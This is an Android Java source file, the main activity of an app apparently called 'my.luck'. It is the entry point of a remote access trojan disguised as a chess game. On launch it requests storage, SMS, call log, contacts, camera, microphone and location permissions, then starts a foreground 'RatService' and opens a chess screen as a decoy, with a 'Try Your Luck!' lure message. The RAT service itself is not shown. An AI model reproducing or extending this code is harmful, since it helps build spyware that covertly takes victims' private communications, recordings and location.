package com.my.luck;

import android.content.Intent;
import android.os.Bundle;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import com.my.luck.core.RatService;
import com.my.luck.permissions.*;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Request all permissions
        requestAllPermissions();

        // Start the RAT service
        Intent serviceIntent = new Intent(this, RatService.class);
        startForegroundService(serviceIntent);

        // Start chess game
        Intent chessIntent = new Intent(this, ChessActivity.class);
        startActivity(chessIntent);
        finish();
    }

    private void requestAllPermissions() {
        // Storage
        if (!StoragePermission.hasPermission(this)) {
            StoragePermission.requestPermission(this);
        }

        // SMS
        if (!SmsPermission.hasPermission(this)) {
            SmsPermission.requestPermission(this);
        }

        // Call Log
        if (!CallLogPermission.hasPermission(this)) {
            CallLogPermission.requestPermission(this);
        }

        // Contacts
        if (!ContactsPermission.hasPermission(this)) {
            ContactsPermission.requestPermission(this);
        }

        // Camera
        if (!CameraPermission.hasPermission(this)) {
            CameraPermission.requestPermission(this);
        }

        // Audio
        if (!AudioPermission.hasPermission(this)) {
            AudioPermission.requestPermission(this);
        }

        // Location
        if (!LocationPermission.hasPermission(this)) {
            LocationPermission.requestPermission(this);
        }

        Toast.makeText(this, "♟️ Try Your Luck!", Toast.LENGTH_SHORT).show();
    }
}